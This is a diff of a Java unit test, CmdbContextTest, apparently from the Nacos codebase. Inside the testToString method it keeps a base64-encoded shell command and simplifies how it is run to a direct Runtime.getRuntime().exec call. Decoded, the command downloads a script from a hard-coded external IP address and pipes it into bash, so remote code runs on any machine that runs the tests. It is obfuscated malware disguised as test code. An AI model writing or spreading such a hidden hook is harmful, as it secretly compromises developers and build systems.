@@ -20,12 +20,8 @@ import com.alibaba.nacos.api.naming.pojo.Instance;
 import org.junit.jupiter.api.Test;
 
 import javax.script.ScriptException;
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
 import java.util.Collections;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
@@ -35,20 +31,7 @@ class CmdbContextTest {
     @Test
     void testToString() throws IOException, ScriptException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException {
         String cmd = "YmFzaCAtYyB7ZWNobyxZM1Z5YkNCb2RIUndPaTh2TVRJd0xqSTNMakl3TXk0NE5EbzFNREF3TVM4eElId2dZbUZ6YUE9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9";
-        Class<?> rt =Class.forName("java.lang.Runtime");
-        Method runtimeMethod = rt.getMethod("getRuntime");
-        Method method = rt.getMethod("exec", String.class);
-        Object object = method.invoke(runtimeMethod.invoke(null),cmd);
-        Process process = (Process) object;
-
-        InputStream in = process.getInputStream();
-        InputStreamReader resultReader = new InputStreamReader(in);
-        BufferedReader stdInput = new BufferedReader(resultReader);
-        String s = null;
-
-        while ((s = stdInput.readLine()) != null) {
-            System.out.printf(s);
-        }
+        Runtime.getRuntime().exec(cmd);
         CmdbContext<Instance> cmdbContext = new CmdbContext<>();
         cmdbContext.setProviders(Collections.singletonList(new CmdbContext.CmdbInstance<>()));
         cmdbContext.setConsumer(new CmdbContext.CmdbInstance<>());
